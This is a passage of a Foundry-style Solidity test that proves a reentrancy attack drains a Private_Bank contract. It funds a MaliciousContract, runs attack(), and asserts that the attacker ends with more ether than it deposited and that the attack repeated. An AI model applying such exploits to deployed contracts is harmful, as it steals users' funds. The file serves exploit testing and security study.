    Private_Bank private bank;
    MaliciousContract private attacker;
    Log private mockLog;
    uint private attackAmount = 1 ether;

    function setUp() public {
        mockLog = new Log();
        bank = new Private_Bank(address(mockLog));
        attacker = new MaliciousContract(bank, attackAmount);
        vm.deal(address(attacker), 10 ether);
    }

    function testReentrancyAttack() public {
        // Deposit funds from attacker
        vm.prank(address(attacker));
        attacker.deposit{value: attackAmount * 3}();

        // Check initial balance
        assertEq(address(bank).balance, attackAmount * 3);

        // Execute attack
        vm.prank(address(attacker));
        attacker.attack();

        // Verify attacker drained more than their deposit
        assertGt(address(attacker).balance, attackAmount * 3);
        assertLt(address(bank).balance, attackAmount);

        // Verify attack was executed multiple times
        assertGt(attacker.attackCount(), 1);
    }
}
